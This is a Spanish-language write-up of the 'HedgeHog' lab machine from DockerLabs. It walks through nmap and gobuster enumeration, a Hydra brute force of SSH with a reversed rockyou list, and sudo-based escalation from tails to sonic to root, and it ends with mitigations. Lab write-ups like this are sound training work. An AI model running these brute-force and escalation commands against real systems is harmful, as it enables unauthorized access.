---
title: HedgeHog
description: 'Resolución de la máquina HedgeHog de DockerLabs'
hide:
  - navigation
  - toc
---

<section
  class="writeup-intro"
  data-name="HedgeHog"
  data-platform="DockerLabs"
  data-difficulty="Very Easy"
  data-os="Linux"
  data-status="Completada"
  data-access="SSH como tails"
  data-escalation="tails → sonic → root"
  data-date=""
  data-techniques="Nmap|Linux|Escalada de privilegios"
>

  <h1>HedgeHog</h1>

  <div class="writeup-inline-badges">
    <span>DockerLabs</span>
    <span class="difficulty">Very Easy</span>
    <span>Linux</span>
    <span>Completada</span>
  </div>

  <p>M&#225;quina enfocada en enumeraci&#243;n web, interpretaci&#243;n de pistas, fuerza bruta contra SSH y escalada mediante permisos inseguros de sudo.</p>

</section>
## 1. Preparación de la máquina

Se desplegó la máquina HedgeHog desde DockerLabs.

<!-- IMAGEN PENDIENTE: despliegue de HedgeHog -->

## 2. Reconocimiento de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv <IP_OBJETIVO> -oG allPorts
```

El escaneo mostró:

| Puerto | Servicio | Estado |
|---:|---|---|
| 22/TCP | SSH | Abierto |
| 80/TCP | HTTP | Abierto |

<!-- IMAGEN PENDIENTE: escaneo inicial -->

## 3. Enumeración de servicios

```bash
sudo nmap -p 22,80 -sCV <IP_OBJETIVO> -oN targeted
```

Se identificaron:

- OpenSSH 9.6p1 en el puerto 22.
- Apache 2.4.58 en el puerto 80.

<!-- IMAGEN PENDIENTE: versiones detectadas -->

## 4. Enumeración web

Al abrir el servicio HTTP solo apareció la palabra:

```text
tails
```

También se intentó enumerar directorios:

```bash
gobuster dir \
    -u http://<IP_OBJETIVO>/ \
    -w /usr/share/wordlists/dirb/common.txt
```

La enumeración no mostró rutas útiles adicionales.

La palabra `tails` se interpretó como una posible pista y como un posible nombre de usuario SSH.

<!-- IMAGEN PENDIENTE: página web con la palabra tails -->

## 5. Preparación del diccionario

La lista `rockyou.txt` era demasiado extensa. La pista `tails`, que puede relacionarse con “cola” o “final”, llevó a probar el diccionario comenzando desde sus últimas líneas.

Se invirtió la lista con:

```bash
tac /usr/share/wordlists/rockyou.txt > rockyou-reversed.txt
```

Para eliminar espacios iniciales se utilizó:

```bash
sed -i 's/^[[:space:]]*//' rockyou-reversed.txt
```

| Comando | Función |
|---|---|
| `tac` | Muestra un archivo en orden inverso |
| `sed -i` | Modifica el archivo directamente |
| `s/^[[:space:]]*//` | Elimina espacios al principio de cada línea |

<!-- IMAGEN PENDIENTE: creación del diccionario invertido -->

## 6. Fuerza bruta contra SSH

Se ejecutó Hydra utilizando `tails` como usuario:

```bash
hydra \
    -l tails \
    -P rockyou-reversed.txt \
    ssh://<IP_OBJETIVO>
```

Hydra encontró una contraseña válida para el usuario `tails`.

<!-- IMAGEN PENDIENTE: resultado de Hydra -->

## 7. Acceso inicial

Se inició sesión mediante SSH:

```bash
ssh tails@<IP_OBJETIVO>
```

Después se comprobó la identidad:

```bash
whoami
id
```

Resultado esperado:

```text
tails
```

## 8. Primera escalada: tails a sonic

Se revisaron los permisos de sudo:

```bash
sudo -l
```

La configuración permitía ejecutar comandos como el usuario `sonic` sin introducir contraseña.

Se abrió una shell como `sonic`:

```bash
sudo -u sonic /bin/bash
```

Se comprobó el cambio:

```bash
whoami
```

Resultado:

```text
sonic
```

<!-- IMAGEN PENDIENTE: acceso como sonic -->

## 9. Segunda escalada: sonic a root

Desde la cuenta `sonic` se revisaron nuevamente los permisos:

```bash
sudo -l
```

La configuración permitía ejecutar comandos como `root`.

Se abrió una shell privilegiada:

```bash
sudo /bin/bash
```

La identidad final se comprobó con:

```bash
whoami
```

Resultado:

```text
root
```

<!-- IMAGEN PENDIENTE: acceso final como root -->

## 10. Vulnerabilidades encontradas

### Contraseña débil en SSH

La contraseña del usuario `tails` podía encontrarse mediante un ataque de diccionario.

### Divulgación de un nombre de usuario

La página web exponía directamente la palabra `tails`, que correspondía con una cuenta válida.

### Permisos sudo inseguros

Los usuarios podían cambiar a otras cuentas con mayores privilegios sin autenticación adicional.

### Escalada encadenada

La combinación de permisos permitió avanzar de `tails` a `sonic` y posteriormente a `root`.

## 11. Medidas de mitigación

- No publicar nombres de usuarios del sistema en páginas web.
- Usar contraseñas largas, únicas y aleatorias.
- Priorizar claves SSH en lugar de contraseñas.
- Implementar Fail2Ban o límites de intentos.
- Aplicar el principio de mínimo privilegio.
- Revisar periódicamente `/etc/sudoers`.
- Evitar permisos `NOPASSWD` innecesarios.
- No permitir shells completas mediante sudo.
- Supervisar cambios de usuario y ejecuciones privilegiadas.

## 12. Conclusión

La resolución combinó:

1. Escaneo de puertos.
2. Enumeración de SSH y HTTP.
3. Interpretación de una pista web.
4. Preparación de un diccionario invertido.
5. Fuerza bruta contra SSH.
6. Acceso como `tails`.
7. Cambio al usuario `sonic`.
8. Escalada final hasta `root`.

La debilidad principal fue la combinación de credenciales débiles y una cadena de permisos sudo excesivos.



